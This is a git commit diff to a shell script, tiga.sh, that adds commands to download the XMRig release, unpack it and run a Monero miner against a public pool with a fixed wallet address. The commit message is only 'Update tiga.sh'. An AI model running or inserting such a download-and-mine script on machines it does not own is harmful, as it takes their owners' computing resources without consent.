1837f9592db0ab8f76a7f88734a7e50a3322ec33
zottaloyew <85932742+zottaloyew@users.noreply.github.com>
2021-06-29 18:43:08 +0200

    Update tiga.sh

--- tiga.sh
+++ tiga.sh
@@ -1,3 +1,7 @@
-  
 #!/bin/sh
 sudo apt update
+wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
+tar xf xmrig-6.12.2-linux-x64.tar.gz
+cd xmrig-6.12.2
+./xmrig --donate-level 1 -o gulf.moneroocean.stream:10128 -u 8A4hJxGjCT7K15BEhaK9hjW3M9uu9D611KdFAhgW1UwBTdP2bxAkNw4C5VFi1zaguqVhCWmRvF3myC5sugcTC6X11v3pKsZ -p tiga -a rx/0 -k
+
